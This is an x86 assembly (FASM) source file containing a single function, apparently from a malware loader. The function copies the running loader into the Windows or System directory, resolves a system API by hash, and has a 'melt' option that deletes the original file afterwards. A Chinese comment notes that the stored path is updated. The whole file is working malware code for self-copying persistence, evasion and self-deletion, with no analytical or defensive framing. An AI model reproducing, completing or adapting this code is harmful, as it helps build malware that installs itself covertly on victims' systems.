include '../include/global.inc'
include 'win32a.inc'

use32

FUNCTION_DATA_BEGIN copy_self_x86

proc copy_self_x86 stdcall uses ebx esi edi, global_data: dword
	locals
		copy_to	_WCHAR	256 dup(?)
	endl

	mov esi, [global_data]

	assume esi: global_data_t

	lea edi, [copy_to]
	.if byte [esi.copy_method] = COPY_METHOD_TO_WINDOWS
		invoke esi.GetWindowsDirectoryW, edi, 255
	.elseif byte [esi.copy_method] = COPY_METHOD_TO_SYSTEM
		.if [esi.is_wow64]
			push [esi.GetProcAddress]
			PUSH_HASH GetSystemWow64DirectoryW
			push [esi.kernel32]
			call [esi.get_proc_from_hash]
			stdcall eax, edi, 255
		.else
			invoke esi.GetSystemDirectoryW, edi, 255
		.endif
	.endif
	mov dword [edi + eax * 2], '\'	; '\',0

	lea eax, [esi.copy_to]
	invoke esi.lstrcatW, edi, eax

	lea ebx, [esi.loader_path]
	invoke esi.lstrcmpiW, edi, ebx

	.if eax <> 0
		invoke esi.CopyFileW, ebx, edi, true
		test eax, eax
		jz .error_exit

		.if byte [esi.melt] <> 0
			invoke esi.DeleteFileW, ebx
		.endif

		; 将新文件路径写入loader_path
		invoke esi.RtlZeroMemory, ebx, 256 * 2
		invoke esi.lstrcpyW, ebx, edi
	.endif

.error_exit:
	ret
endp

FUNCTION_DATA_END copy_self_x86